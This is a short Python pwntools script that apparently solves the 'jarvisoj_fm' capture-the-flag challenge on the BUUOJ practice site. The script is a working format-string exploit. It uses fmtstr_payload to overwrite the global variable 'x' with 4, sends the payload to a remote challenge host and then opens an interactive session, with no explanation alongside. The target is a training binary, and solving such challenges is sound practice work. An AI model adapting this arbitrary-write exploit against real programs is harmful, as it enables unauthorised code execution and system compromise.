from pwn import *


def jarvisoj_fm(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/jarvisoj_fm'):
    target = process([file_name])
    target = remote('node5.buuoj.cn', 29389)
    target_elf = ELF(file_name)

    x_bss = p32(target_elf.symbols['x'])

    payload = fmtstr_payload(11, {u32(x_bss): 4})

    target.sendline(payload)

    target.interactive()


if __name__ == '__main__':
    jarvisoj_fm()
